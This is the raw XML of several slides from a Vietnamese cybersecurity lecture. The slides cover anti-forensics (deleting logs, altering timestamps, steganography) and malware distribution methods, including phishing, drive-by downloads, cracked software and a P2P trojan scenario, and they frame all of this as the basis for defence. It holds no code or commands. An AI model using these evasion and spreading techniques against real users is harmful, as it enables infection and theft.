                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Xóa dấu vết (Anti-Forensics)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Xóa log hệ thống hoặc thay đổi timestamp của file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sử dụng kỹ thuật mã hóa hoặc ẩn dữ liệu (steganography).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Làm khó việc phân tích pháp y nhằm trì hoãn hoặc ngăn chặn phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Quy trình này phản ánh cách kẻ tấn công thực </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hiện</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tấn</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công</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mục</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tiêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nhưng cũng chính là cơ sở để các chuyên gia an ninh mạng xây dựng biện pháp phòng thủ, như: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>V</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>á </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lỗi kịp thời, giám sát hệ thống, sử dụng IDS/IPS, và thực hiện điều tra số (digital forensics).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF00FF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23097478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993353"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thuật phát tán Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Email </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>&amp; Phishing: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Gửi tệp đính kèm hoặc liên kết độc hại qua email lừa đảo.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Drive-by Download: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khai thác lỗ hổng trình duyệt/plug-in, người dùng chỉ cần truy cập website là bị nhiễm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>USB/Thiết bị ngoại vi: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cài mã độc ẩn trong autorun hoặc firmware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Malvertising: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chèn mã độc vào quảng cáo trực tuyến.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khai thác phần mềm bẻ khóa (crack/keygen): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chèn mã độc vào các phần mềm vi phạm bản quyền.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Mạng ngang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hàng (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P2P): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ẩn mã độc trong file chia sẻ.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Social Engineering: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Dụ người dùng tự tải và cài đặt malware (ví dụ: “bản vá giả”, “trình cập nhật giả”).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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4048394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993353"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thuật phát tán Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ</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thuật</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phát</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tán</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Mạng</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ngang</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hàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kịch bản minh họa:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Một hacker chèn mã độc vào file phổ biến (ví dụ: phần mềm crack, game, phim).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>File này được chia sẻ lên mạng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P2P/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"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r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khi người dùng tải và chạy, malware sẽ được cài đặt ngầm vào hệ thống.</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1032660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993353"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thuật phát tán Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ</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thuật</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phát</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tán</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Mạng</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ngang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hang (P2P):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cách </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thức hoạt động:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Người dùng tìm kiếm và tải file .exe, .mp4, .zip… trên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P2P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"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r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>File chứa payload ẩn (trojan, backdoor).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sau khi mở </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>file</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thì</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malware tự động chạy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>và</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rồi</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đánh cắp thông tin, mở cổng backdoor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Malware có thể tiếp tục tự nhân bản và chia sẻ lại qua chính mạng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P2P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>: L</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
